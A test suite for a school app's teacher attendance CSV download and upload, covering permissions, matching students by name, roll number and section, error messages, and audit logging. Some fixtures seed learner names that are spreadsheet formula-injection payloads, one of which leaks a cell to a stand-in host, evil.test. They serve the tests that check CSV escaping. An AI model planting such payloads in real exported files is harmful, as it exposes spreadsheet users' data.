// A teacher uploads one of her sessions' attendance as a CSV.
//
// ── THE DEFECT ─────────────────────────────────────────────────────────────
//
// Nothing in the teacher area took a file: a session's attendance was a
// per-student roster only, so a class of forty was forty clicks, and the
// owner's ask -- "upload attendance for their class (CSV or one row at a
// time)" -- had no CSV half. (Found in the 5 Oct 2026 QA of the teacher flows,
// D-5.)
//
// ── THE RULE ───────────────────────────────────────────────────────────────
//
// On her own session page, while the session is editable and not cancelled,
// she downloads the roster (student, rollNumber, section, a blank status) and
// uploads it back. Students are found ONLY on that session's roster: an
// unknown student, an ambiguous name (the candidates are named by roll number)
// or a bad status is a row's problem, reported with its line, and the good rows
// still land. A student the file does not name stays unmarked -- never present.
// The marks, the session's attended / total and each student's % are written by
// the code the roster form uses, so every view agrees. Another teacher's
// session is a 404; approvers keep the admin CSV; mentors and observers get
// nothing.
//
// Executed: the real route handler, server action and pages on Postgres.

import { test, after } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { elements, openingTags, attr, render, request, withAppRouter } from "./_ui.js";
import { needsDatabase, withClient } from "./_harness.js";
import { form } from "./_admin-fixture.js";
import { closeAppDb, outcome, signIn } from "./_server-actions.js";
import { as, assertDocumented, countsOf, csvForm, marksOf, teachingWorld, type TeachingWorld } from "./_teaching-world.js";

const skip = needsDatabase();
const Papa = createRequire(new URL("../../apps/web/package.json", import.meta.url))("papaparse") as {
  parse: <T>(s: string, o: { skipEmptyLines: boolean }) => { data: T[] };
  unparse: (d: { fields: string[]; data: Array<Record<string, string>> }, o: object) => string;
};
const CSV_EXPORT_OPTIONS = { escapeFormulae: true };
after(async () => {
  if (!skip) await closeAppDb();
});

const APP = "../../apps/web/src/app/(authenticated)/teaching";
const API = "../../apps/web/src/app/api/teaching";
const DOC_ROOT = "../../apps/web/src/app/(authenticated)";
type State = { error?: string; ok?: string; issues?: string[] } | undefined;

const upload = async (fd: FormData): Promise<State> => {
  const { uploadAttendanceCsvAction } = await import(`${APP}/sessions/attendance-csv.ts`);
  return uploadAttendanceCsvAction(undefined, fd);
};
const rosterRoute = async (id: string): Promise<Response> => {
  const { GET } = await import(`${API}/sessions/[id]/roster/route.ts`);
  return GET(new Request(`http://app.test/api/teaching/sessions/${id}/roster`), { params: Promise.resolve({ id }) });
};

async function sessionPage(id: string): Promise<{ kind: string; html?: string }> {
  const { default: Page } = (await import(`${APP}/sessions/[id]/page.tsx`)) as { default: (p: unknown) => Promise<unknown> };
  const r = await outcome(() => Page({ params: Promise.resolve({ id }) }));
  if (r.kind !== "returned") return r as { kind: string };
  return { kind: "returned", html: await render(withAppRouter(r.value)) };
}

async function inWorld(body: (w: TeachingWorld) => Promise<void>) {
  await withClient(async (c) => {
    const w = await teachingWorld(c, "tatt");
    try {
      await body(w);
    } finally {
      request.locale = "en";
      await w.f.cleanup();
    }
  });
}

/** Her roster's checked radios, as [learner id, value]. */
function checked(html: string): Array<[string, string]> {
  return openingTags(html, "input")
    .filter((tag) => attr(tag, "type") === "radio" && / checked(=|\s|\/|>)/.test(tag))
    .map((tag) => [(attr(tag, "name") ?? "").replace("status_", ""), attr(tag, "value") ?? ""]);
}

test("the roster CSV is her session's roster, to fill in: names, roll numbers, sections, a blank status", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    // A name and a roll number a spreadsheet would run as a formula.
    await w.f.row("learners", { class_id: w.five, school_id: w.school, grade: 5, name: `=HYPERLINK("http://evil.test")`, roll_number: "+7", section: "A" });
    as(w.teacherUser, "teacher");

    const res = await rosterRoute(id);
    assert.equal(res.status, 200);
    assert.match(res.headers.get("content-type") ?? "", /^text\/csv/);
    assert.match(res.headers.get("content-disposition") ?? "", /^attachment; filename="[\w.-]+\.csv"$/);
    assert.match(res.headers.get("cache-control") ?? "", /no-store/, "it names children: nothing caches it");
    const body = await res.text();
    const [header, ...rows] = Papa.parse<string[]>(body.trim(), { skipEmptyLines: true }).data;
    assert.deepEqual(header, ["student", "rollNumber", "section", "status"]);
    // Section A's roster (Deskit is in section B), status blank: six students.
    assert.equal(rows.length, 6);
    assert.deepEqual(
      rows.filter((r) => !r[0]!.includes("HYPERLINK")).map((r) => r.join(",")).sort(),
      ["Angmo,1,A,", "Bilal,2,A,", "Chosdol,3,A,", "Tashi,5,A,", "Tashi,6,A,"],
    );
    assert.ok(!body.includes("Deskit"), "a student of another section is not on her roster");
    // The formula cell comes out as the admin export writes one: text, not a formula.
    const formula = rows.find((r) => r[0]!.includes("HYPERLINK"))!;
    assert.equal(formula[0], `'=HYPERLINK("http://evil.test")`);
    assert.equal(formula[1], "'+7");
    // Byte for byte what the admin export writes for those two cells (admin/csv-safety.ts).
    const adminCells = Papa.unparse(
      { fields: ["student", "rollNumber"], data: [{ student: `=HYPERLINK("http://evil.test")`, rollNumber: "+7" }] },
      CSV_EXPORT_OPTIONS,
    ).split(/\r?\n/)[1]!;
    assert.ok(body.includes(`${adminCells},A,`), "formula cells are escaped exactly as the admin export does");

    // Rendering or downloading a learner list is audited (SM-9).
    const audited = await w.c.query(
      `SELECT entity_id, metadata FROM audit_log WHERE user_id = $1 AND action = 'teaching.students.viewed' AND metadata->>'page' = 'roster_csv'`,
      [w.teacherUser],
    );
    assert.equal(audited.rowCount, 1);
    assert.deepEqual(audited.rows[0].metadata, { page: "roster_csv", rowCount: 6 });
    assertDocumented("teaching.students.viewed", { entity_type: "session", metadata: audited.rows[0].metadata });
    assert.equal(audited.rows[0].entity_id, id);
  });
});

test("the roster CSV is hers alone: a colleague's session, a locked or cancelled one, and every other role get nothing", { skip }, async () => {
  await inWorld(async (w) => {
    const mine = await w.session();
    const theirs = await w.session({ teacher_id: w.other, class_id: w.six, section: null });
    const pending = await w.session({ approval_status: "pending" });
    const approved = await w.session({ approval_status: "approved" });
    const cancelled = await w.session({ status: "cancelled" });

    as(w.otherUser, "teacher");
    assert.equal((await rosterRoute(mine)).status, 404, "another teacher's session is a 404, not a roster");
    assert.equal((await rosterRoute("00000000-0000-4000-8000-000000000000")).status, 404, "no such session: the same answer");
    assert.equal((await rosterRoute("not-a-uuid")).status, 404);

    as(w.teacherUser, "teacher");
    assert.equal((await rosterRoute(theirs)).status, 404, "and she cannot read a colleague's either");
    for (const id of [pending, approved, cancelled]) assert.equal((await rosterRoute(id)).status, 409, "nothing to fill in once it cannot take attendance");

    for (const [who, role] of [[w.padmin, "programme_admin"], [w.mentor, "mentor"], [w.observer, "observer"]] as const) {
      as(who, role);
      assert.equal((await rosterRoute(mine)).status, 403, `${role} is not a teacher`);
    }
    signIn(null);
    assert.equal((await rosterRoute(mine)).status, 401);

    // No page offers it either, in those states: the roster form is the same rule.
    as(w.teacherUser, "teacher");
    assert.match((await sessionPage(mine)).html!, /Download roster CSV/);
    assert.match((await sessionPage(mine)).html!, /Upload attendance CSV/);
    for (const id of [pending, approved, cancelled]) {
      const html = (await sessionPage(id)).html!;
      assert.doesNotMatch(html, /Download roster CSV|Upload attendance CSV/);
    }
    as(w.padmin, "programme_admin");
    assert.doesNotMatch((await sessionPage(mine)).html!, /Download roster CSV|Upload attendance CSV/, "approvers read the session; they keep the admin CSV");
  });
});

test("an uploaded file marks the students it names, wherever the file came from, and leaves the rest unmarked", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    await w.f.row("learners", { class_id: w.five, school_id: w.school, grade: 5, name: "Dolma, Tsering", roll_number: "8", section: "A" });
    as(w.teacherUser, "teacher");

    // Excel's way: a BOM, CRLF line ends, a quoted comma, any case, a roll number or a name.
    const csv = [
      "﻿student,rollNumber,status",
      "Angmo,,PRESENT",
      "Bilal,,Absent",
      ",3,late",
      '"Dolma, Tsering",8,excused',
      "",
    ].join("\r\n");
    const done = await upload(csvForm(csv, { id }));
    assert.match(done?.ok ?? "", /Attendance uploaded: 4 students marked\. 2 of 4 attended\./, JSON.stringify(done));
    assert.equal(done?.error, undefined);
    assert.equal(done?.issues?.length ?? 0, 0);

    const dolma = (await w.c.query(`SELECT id FROM learners WHERE name = 'Dolma, Tsering' AND school_id = $1`, [w.school])).rows[0].id as string;
    assert.deepEqual(await marksOf(w.c, id), { [w.angmo]: "present", [w.bilal]: "absent", [w.chosdol]: "late", [dolma]: "excused" });
    assert.deepEqual(await countsOf(w.c, id), { attended_count: 2, total_count: 4 });
    const by = await w.c.query(`SELECT DISTINCT marked_by_user_id FROM session_attendance WHERE session_id = $1`, [id]);
    assert.deepEqual(by.rows.map((r) => r.marked_by_user_id), [w.teacherUser]);
    const pct = async (l: string) => (await w.c.query(`SELECT attendance_pct FROM learners WHERE id = $1`, [l])).rows[0].attendance_pct;
    assert.deepEqual([await pct(w.angmo), await pct(w.bilal), await pct(w.chosdol), await pct(w.tashi5)], [100, 0, 100, null], "each marked student's attendance %; an unmarked one has none");

    // The two Tashis were not in the file: unmarked, not present. The page says so.
    assert.equal((await marksOf(w.c, id))[w.tashi5], undefined);
    const html = (await sessionPage(id)).html!;
    assert.deepEqual(
      checked(html).sort(),
      [[w.angmo, "present"], [w.bilal, "absent"], [w.chosdol, "late"], [dolma, "excused"]].sort(),
      "the roster form shows what the file marked, and nothing for the two it left out",
    );
    assert.match(html, /2 of 4 attended/);

    // Saving the roster as it stands is refused until the rest are marked.
    const { saveAttendanceAction } = (await import(`${APP}/sessions/actions.ts`)) as { saveAttendanceAction: (p: unknown, fd: FormData) => Promise<State> };
    assert.match((await saveAttendanceAction(undefined, form({ id })))?.error ?? "", /2 students have no attendance mark/);

    const audit = await w.c.query(`SELECT entity_type, metadata FROM audit_log WHERE user_id = $1 AND action = 'teaching.attendance.imported'`, [w.teacherUser]);
    assert.equal(audit.rowCount, 1);
    assert.deepEqual(audit.rows[0].metadata, { rows: 4, marked: 4, rejected: 0, present: 1, absent: 1, late: 1, excused: 1, attended: 2, total: 4 });
    assert.ok(!JSON.stringify(audit.rows[0].metadata).includes("Angmo"), "no names in the audit row (SM-9)");
    assertDocumented("teaching.attendance.imported", audit.rows[0]);
  });
});

test("the downloaded roster, filled in, uploads back as it is -- even a name the export had to escape", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    const odd = await w.f.row("learners", { class_id: w.five, school_id: w.school, grade: 5, name: `=HYPERLINK("http://evil.test")`, roll_number: "+7", section: "A" });
    as(w.teacherUser, "teacher");

    const downloaded = await (await rosterRoute(id)).text();
    const { data } = Papa.parse<string[]>(downloaded.trim(), { skipEmptyLines: true });
    // She types a status into the last column of every row, as in a spreadsheet.
    const filled = data.map((row, i) => (i === 0 ? row : [...row.slice(0, 3), ["present", "absent", "late", "excused"][i % 4]!]));
    const csv = filled.map((row) => row.map((c) => `"${c.replace(/"/g, '""')}"`).join(",")).join("\r\n");
    const done = await upload(csvForm(csv, { id }));
    assert.match(done?.ok ?? "", /6 students marked/, JSON.stringify(done));
    assert.equal(done?.issues?.length ?? 0, 0, JSON.stringify(done?.issues));
    const marks = await marksOf(w.c, id);
    assert.equal(Object.keys(marks).length, 6);
    assert.ok(odd in marks, "the student whose name began with = was found: the escape is undone on the way in");
  });
});

test("a row that cannot be used is reported with its line, and the rows that can are still marked", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");

    const csv = [
      "student,rollNumber,status", // line 1
      "Angmo,,present", // 2  ok
      "Nobody,,present", // 3  not on the roster
      "Tashi,,absent", // 4  two Tashis
      "Bilal,,maybe", // 5  not a status
      "Chosdol,,", // 6  no status
      ",,present", // 7  nobody named
      "Angmo,,absent", // 8  Angmo again
      "Deskit,,present", // 9  a student of section B, not on this roster
      "Angmo,2,present", // 10 roll 2 is Bilal
      "Tashi,5,late", // 11 the roll number tells the Tashis apart
    ].join("\n");
    const res = await upload(csvForm(csv, { id }));
    assert.match(res?.ok ?? "", /2 students marked\. 2 of 2 attended\. 8 rows were not imported:/, JSON.stringify(res));
    assert.deepEqual(await marksOf(w.c, id), { [w.angmo]: "present", [w.tashi5]: "late" });
    assert.deepEqual(await countsOf(w.c, id), { attended_count: 2, total_count: 2 });

    const issues = res?.issues ?? [];
    assert.equal(issues.length, 8);
    const at = (line: number) => issues.find((i) => i.startsWith(`Line ${line}:`)) ?? "";
    assert.match(at(3), /Nobody is not on this session's roster/);
    assert.match(at(4), /Tashi matches 2 students \(roll 5, roll 6\)/, "an ambiguous name names its candidates by roll number");
    assert.match(at(5), /"maybe" is not a status\. Use one of: present, absent, late, excused/);
    assert.match(at(6), /Chosdol has no status/);
    assert.match(at(7), /student name or a roll number/);
    assert.match(at(8), /Angmo is already marked on line 2/);
    assert.match(at(9), /Deskit is not on this session's roster/);
    assert.match(at(10), /Angmo \(roll 2\) is not on this session's roster/, "a name and a roll number must name the same student");
    assert.deepEqual(issues.map((i) => Number(/^Line (\d+):/.exec(i)![1])), [3, 4, 5, 6, 7, 8, 9, 10], "in line order");

    // Fix the rows and upload again: only what is named is touched.
    const again = await upload(csvForm(["student,rollNumber,status", "Tashi,6,absent", "Angmo,,absent"].join("\n"), { id }));
    assert.match(again?.ok ?? "", /2 students marked\. 1 of 3 attended\./);
    assert.deepEqual(await marksOf(w.c, id), { [w.angmo]: "absent", [w.tashi5]: "late", [w.tashi6]: "absent" }, "a corrected row replaces the earlier mark");
  });
});

test("a file with nothing usable, or no usable shape, writes nothing and says why", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");
    const err = async (fd: FormData) => (await upload(fd))?.error ?? "";

    assert.match(await err(form({ id })), /Choose a CSV file first/);
    assert.match(await err(csvForm("", { id })), /Choose a CSV file first/);
    assert.match(await err(csvForm("student,status\n", { id })), /no rows to import/);
    assert.match(await err(csvForm("student,rollNumber\nAngmo,1\n", { id })), /needs a status column/);
    assert.match(await err(csvForm("section,status\nA,present\n", { id })), /needs a student \/ rollNumber column/);
    assert.match(await err(csvForm('student,status\n"Angmo,present\n', { id })), /could not be read as a CSV/);

    const bad = await upload(csvForm("student,status\nNobody,present\nAngmo,never\n", { id }));
    assert.match(bad?.error ?? "", /No rows were imported/);
    assert.equal(bad?.issues?.length, 2);
    assert.equal(bad?.ok, undefined);

    // A page of complaints is not a wall: the first 50 rows are listed, the rest counted.
    const many = await upload(csvForm(["student,status", ...Array.from({ length: 60 }, (_, i) => `Nobody ${i},present`)].join("\n"), { id }));
    assert.match(many?.error ?? "", /No rows were imported/);
    assert.equal(many?.issues?.length, 51);
    assert.match(many?.issues?.[0] ?? "", /^Line 2: /);
    assert.match(many?.issues?.[50] ?? "", /…and 10 more rows not imported/);

    // Size and row caps, as the admin import has: a huge file is refused unread.
    const rows = Array.from({ length: 1001 }, () => "Angmo,present").join("\n");
    assert.match(await err(csvForm(`student,status\n${rows}`, { id })), /more than 1000 rows/);
    assert.match(await err(csvForm(`student,status\n${"x".repeat(600 * 1024)}`, { id })), /too large/);
    assert.deepEqual(await marksOf(w.c, id), {}, "nothing was written by any of these");
    assert.deepEqual(await countsOf(w.c, id), { attended_count: 0, total_count: 0 });
  });
});

test("the upload is hers alone, and only while the session can take attendance", { skip }, async () => {
  await inWorld(async (w) => {
    const csv = "student,status\nAngmo,present\n";
    const mine = await w.session();
    const theirs = await w.session({ teacher_id: w.other, class_id: w.six, section: null });
    const cancelled = await w.session({ status: "cancelled" });
    const pending = await w.session({ approval_status: "pending" });
    const approved = await w.session({ approval_status: "approved" });

    as(w.otherUser, "teacher");
    assert.match((await upload(csvForm(csv, { id: mine })))?.error ?? "", /not found/, "a colleague's session");
    as(w.teacherUser, "teacher");
    assert.match((await upload(csvForm(csv, { id: theirs })))?.error ?? "", /not found/);
    assert.match((await upload(csvForm(csv, { id: "00000000-0000-4000-8000-000000000000" })))?.error ?? "", /not found/);
    assert.match((await upload(csvForm(csv, { id: cancelled })))?.error ?? "", /cancelled/);
    for (const id of [pending, approved]) assert.match((await upload(csvForm(csv, { id })))?.error ?? "", /can no longer be changed/);

    for (const [who, role] of [[w.padmin, "programme_admin"], [w.mentor, "mentor"], [w.observer, "observer"]] as const) {
      as(who, role);
      assert.match((await upload(csvForm(csv, { id: mine })))?.error ?? "", /Only teachers/, role);
    }
    for (const id of [mine, theirs, cancelled, pending, approved]) assert.deepEqual(await marksOf(w.c, id), {}, "no mark landed");
  });
});

test("a file can name the status in her own language", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");
    request.locale = "hi";
    // Headers too: any case, and "name" for "student".
    const res = await upload(csvForm("Name,Status\nAngmo,उपस्थित\nBilal,देर से\nChosdol,present\n", { id }));
    assert.equal(res?.error, undefined, JSON.stringify(res));
    assert.deepEqual(await marksOf(w.c, id), { [w.angmo]: "present", [w.bilal]: "late", [w.chosdol]: "present" }, "her language's words, and English, both read");
  });
});

test("what she uploads is what the admin attendance table and the Repository show", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");
    const res = await upload(csvForm("student,status\nAngmo,present\nBilal,absent\nChosdol,late\n", { id }));
    assert.match(res?.ok ?? "", /3 students marked\. 2 of 3 attended\./, JSON.stringify(res));

    // The admin attendance table: the rows, and the marks on them.
    as(w.padmin, "programme_admin");
    request.cookies = { "gml-device": "desktop" };
    const { default: Grid } = (await import(`${DOC_ROOT}/admin/data/[entity]/page.tsx`)) as { default: (p: unknown) => Promise<unknown> };
    const grid = await render(
      withAppRouter(await Grid({ params: Promise.resolve({ entity: "session-attendance" }), searchParams: Promise.resolve({ "filter[sessionId]": id }) })),
    );
    const cells = elements(grid, "td").map((td) => td.text);
    const rowsOf = elements(grid, "tr").map((tr) => tr.text).filter((text) => /Angmo|Bilal|Chosdol/.test(text));
    assert.equal(rowsOf.length, 3, `three attendance rows for this session in the admin table: ${JSON.stringify(rowsOf)}`);
    for (const [name, status] of [["Angmo", "present"], ["Bilal", "absent"], ["Chosdol", "late"]]) {
      assert.ok(rowsOf.some((r) => r.includes(name!) && r.includes(status!)), `${name} is ${status} in the admin table`);
    }
    assert.ok(!cells.some((c) => c.includes("Tashi")), "the students the file did not name have no row");

    // The Repository's session page: attended / total, for the teacher and for an admin.
    const { default: RepoSession } = (await import(`${DOC_ROOT}/repo/session/[id]/page.tsx`)) as { default: (p: unknown) => Promise<unknown> };
    for (const [who, role] of [[w.teacherUser, "teacher"], [w.padmin, "programme_admin"]] as const) {
      as(who, role);
      const repo = await render(withAppRouter(await RepoSession({ params: Promise.resolve({ id }) })));
      assert.match(repo, /2 \/ 3/, `${role}: the Repository says 2 of 3 attended`);
    }
    // And her own page.
    as(w.teacherUser, "teacher");
    assert.match((await sessionPage(id)).html!, /2 of 3 attended/);
  });
});

// ── Review findings on this feature (second round) ──────────────────────────
//
// Found by independent reviewers of the first version; each test below failed
// against it. The downloaded roster has to survive a spreadsheet and come back:
// Excel turns a roll number 01 into 1, a section is the only thing that tells
// two children of a whole-grade session apart, a Devanagari name needs a BOM to
// open as itself, and a cell that begins = + - @ must never run.

const learner = (w: TeachingWorld, name: string, roll: string | null, section: string | null, classId = w.five, grade = 5) =>
  w.f.row("learners", { class_id: classId, school_id: w.school, grade, name, roll_number: roll, section });

test("a roll number Excel has turned from 07 into 7 is still that student", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    const dolma = await learner(w, "Dolma", "07", "A");
    const sonam = await learner(w, "Sonam", "010", "A");
    const pema = await learner(w, "Pema", "A-05", "A");
    as(w.teacherUser, "teacher");

    // Name and roll as the roster wrote them, after a spreadsheet dropped the zeros; a roll-only row; a roll no spreadsheet touches.
    const csv = ["student,rollNumber,section,status", "Dolma,7,A,present", ",10,,late", "Pema,A-05,A,absent", "Angmo,1,A,excused"].join("\r\n");
    const done = await upload(csvForm(csv, { id }));
    assert.match(done?.ok ?? "", /4 students marked/, JSON.stringify(done));
    assert.equal(done?.issues?.length ?? 0, 0, JSON.stringify(done?.issues));
    assert.deepEqual(await marksOf(w.c, id), { [dolma]: "present", [sonam]: "late", [pema]: "absent", [w.angmo]: "excused" });

    // A class that holds both 1 and 01: a spreadsheet cannot say which one "1" was, so a roll-only row is reported, never guessed;
    // the name settles it.
    const one = await learner(w, "Zhaxi", "01", "A");
    const both = await upload(csvForm("student,rollNumber,status\n,1,absent\nZhaxi,1,late\n", { id }));
    assert.match(both?.ok ?? "", /1 student marked/, JSON.stringify(both));
    assert.match(both?.issues?.[0] ?? "", /^Line 2: roll 1 matches 2 students \(roll (1, roll 01|01, roll 1)\)/, both?.issues?.[0]);
    const marks = await marksOf(w.c, id);
    assert.equal(marks[one], "late");
    assert.equal(marks[w.angmo], "excused", "Angmo keeps the mark she had: the ambiguous row marked nobody");
  });
});

test("on a whole-grade session the section column tells children with one roll apart", { skip }, async () => {
  await inWorld(async (w) => {
    const anu = await learner(w, "Anu", "1", "A", w.six, 6);
    const ben = await learner(w, "Ben", "1", "B", w.six, 6);
    const tenzinA = await learner(w, "Tenzin", "2", "A", w.six, 6);
    const tenzinB = await learner(w, "Tenzin", "2", "B", w.six, 6);
    const id = await w.session({ class_id: w.six, section: null });
    as(w.teacherUser, "teacher");

    // Roll numbers restart in every section: the roll and the section together are the child.
    const done = await upload(csvForm("rollNumber,section,status\n1,A,present\n1,b,absent\n2,A,late\n2,B,excused\n", { id }));
    assert.match(done?.ok ?? "", /4 students marked/, JSON.stringify(done));
    assert.deepEqual(await marksOf(w.c, id), { [anu]: "present", [ben]: "absent", [tenzinA]: "late", [tenzinB]: "excused" });

    // The roster as downloaded, with only the status filled in, comes back whole.
    const { data } = Papa.parse<string[]>((await (await rosterRoute(id)).text()).trim(), { skipEmptyLines: true });
    assert.deepEqual(data.slice(1).map((r) => r.join(",")).sort(), ["Anu,1,A,", "Ben,1,B,", "Tenzin,2,A,", "Tenzin,2,B,"]);
    const filled = data.map((row, i) => (i === 0 ? row : [...row.slice(0, 3), "absent"]));
    const again = await upload(csvForm(filled.map((r) => r.join(",")).join("\r\n"), { id }));
    assert.match(again?.ok ?? "", /4 students marked/, JSON.stringify(again));
    assert.deepEqual(Object.values(await marksOf(w.c, id)), ["absent", "absent", "absent", "absent"]);

    // Without the section the file cannot choose; the message names the sections, and does not ask for a column it has.
    const lost = await upload(csvForm("student,rollNumber,section,status\nTenzin,2,,present\n,1,,present\n", { id }));
    assert.match(lost?.error ?? "", /No rows were imported/);
    assert.match(lost?.issues?.[0] ?? "", /^Line 2: Tenzin matches 2 students \(roll 2, section A; roll 2, section B\)\. .*section column/, lost?.issues?.[0]);
    assert.match(lost?.issues?.[1] ?? "", /^Line 3: roll 1 matches 2 students \(roll 1, section A; roll 1, section B\)\. .*section column/);
  });
});

test("two children who cannot be told apart in a file are sent to the page, not to a column that cannot help", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    await learner(w, "Nima", null, "A");
    await learner(w, "Nima", null, "A");
    as(w.teacherUser, "teacher");

    const res = await upload(csvForm("student,rollNumber,status\nNima,,present\nTashi,,present\n", { id }));
    const nima = (res?.issues ?? []).find((i) => i.startsWith("Line 2:")) ?? "";
    assert.match(nima, /Nima matches 2 students \(no roll number, no roll number\)/);
    assert.match(nima, /roll numbers under My students, or mark them on the session page/);
    assert.doesNotMatch(nima, /Add a rollNumber column/);
    // Two Tashis who do have roll numbers are still told to give one.
    assert.match((res?.issues ?? []).find((i) => i.startsWith("Line 3:")) ?? "", /Tashi matches 2 students \(roll 5, roll 6\)\. .*roll number/);
  });
});

test("a name and a roll number that disagree say which one does not fit", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");

    const res = await upload(csvForm("student,rollNumber,status\nBilal,9,present\nTashi Doma,6,present\nAngmo,2,present\nNobody,9,present\n", { id }));
    const at = (line: number) => (res?.issues ?? []).find((i) => i.startsWith(`Line ${line}:`)) ?? "";
    assert.match(at(2), /Bilal \(roll 9\) does not match the roster: Bilal has roll 2\./);
    assert.match(at(3), /Tashi Doma \(roll 6\) does not match the roster: roll 6 is Tashi\./);
    assert.match(at(4), /Angmo \(roll 2\) is not on this session's roster/, "two different students: the plain answer");
    assert.match(at(5), /Nobody \(roll 9\) is not on this session's roster/);
    assert.deepEqual(await marksOf(w.c, id), {});
  });
});

test("the roster opens in Excel as UTF-8, and Devanagari and Tibetan names come back as themselves", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    const hindi = await learner(w, "तन्ज़िन डोल्मा", "21", "A");
    const tibetan = await learner(w, "བསྟན་འཛིན", "22", "A");
    as(w.teacherUser, "teacher");

    const res = await rosterRoute(id);
    const bytes = new Uint8Array(await res.arrayBuffer());
    assert.deepEqual([...bytes.slice(0, 3)], [0xef, 0xbb, 0xbf], "a UTF-8 byte order mark, or Excel reads the names as Windows-1252");
    const text = new TextDecoder("utf-8", { ignoreBOM: true }).decode(bytes);
    assert.ok(text.startsWith("﻿student,rollNumber,section,status"));

    const { data } = Papa.parse<string[]>(text.slice(1).trim(), { skipEmptyLines: true });
    const filled = data.map((row, i) => (i === 0 ? row : [...row.slice(0, 3), "present"]));
    const done = await upload(csvForm("﻿" + filled.map((r) => r.map((c) => `"${c}"`).join(",")).join("\r\n"), { id }));
    assert.match(done?.ok ?? "", /7 students marked/, JSON.stringify(done));
    const marks = await marksOf(w.c, id);
    assert.equal(marks[hindi], "present");
    assert.equal(marks[tibetan], "present");
  });
});

test("a name with a line break inside cannot run as a formula in the roster she downloads", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    // What Papa's own escapeFormulae misses: a cell whose formula spans lines.
    const names = ["=1+1\nfoo", "-2\nz", "@SUM(1)\r\nx", "\t=1\nx", `=HYPERLINK("http://evil.test/?"&B2,\n"click")`];
    for (const [i, name] of names.entries()) await learner(w, name, String(90 + i), "A");
    as(w.teacherUser, "teacher");

    const body = await (await rosterRoute(id)).text();
    const { data } = Papa.parse<string[]>(body.trim(), { skipEmptyLines: true });
    assert.equal(data.length, 1 + 5 + 5);
    for (const row of data.slice(1)) assert.doesNotMatch(row[0]!, /^[=+\-@\t\r]/, `${JSON.stringify(row[0])} would run as a formula`);
    assert.equal(data.filter((r) => r[0]!.startsWith("'")).length, 5, "all five came out as text");
  });
});

test("a workbook or a UTF-16 file is told to be saved as CSV, not told its columns are missing", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");
    const xlsx = `PK\u0003\u0004${"\u0000".repeat(40)}[Content_Types].xml`;
    const utf16 = [..."student,status\nAngmo,present\n"].join("\u0000");
    for (const [name, content] of [["roster.xlsx", xlsx], ["roster.csv", utf16]] as const) {
      const err = (await upload(csvForm(content, { id }, name)))?.error ?? "";
      assert.match(err, /not a plain CSV/, name);
      assert.match(err, /Save as/, name);
    }
    assert.deepEqual(await marksOf(w.c, id), {});
  });
});

test("the CSV controls come before the roster, and the file is named for the class and the day", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    const whole = await w.session({ class_id: w.six, section: null, scheduled_date: "2026-10-07" });
    as(w.teacherUser, "teacher");

    const html = (await sessionPage(id)).html!;
    const at = (needle: string) => html.indexOf(needle);
    assert.ok(at("Download roster CSV") > 0 && at('type="radio"') > 0);
    assert.ok(at("Download roster CSV") < at('type="radio"'), "a class of forty must not have to scroll the whole list to find the upload");
    assert.ok(at("Upload attendance CSV") < at('type="radio"'));

    assert.match((await rosterRoute(id)).headers.get("content-disposition") ?? "", /filename="attendance-grade5A-2026-10-05\.csv"/);
    assert.match((await rosterRoute(whole)).headers.get("content-disposition") ?? "", /filename="attendance-grade6-2026-10-07\.csv"/);
  });
});

test("a refused Save attendance refreshes the page, so a student added in the meantime shows up", { skip }, async () => {
  await inWorld(async (w) => {
    const id = await w.session();
    as(w.teacherUser, "teacher");
    const { saveAttendanceAction } = (await import(`${APP}/sessions/actions.ts`)) as { saveAttendanceAction: (p: unknown, fd: FormData) => Promise<State> };

    request.revalidated = [];
    const refused = await saveAttendanceAction(undefined, form({ id }));
    assert.match(refused?.error ?? "", /5 students have no attendance mark/);
    assert.ok((request.revalidated ?? []).includes(`/teaching/sessions/${id}`), "the roster she was looking at is stale: the page is fetched again");
  });
});
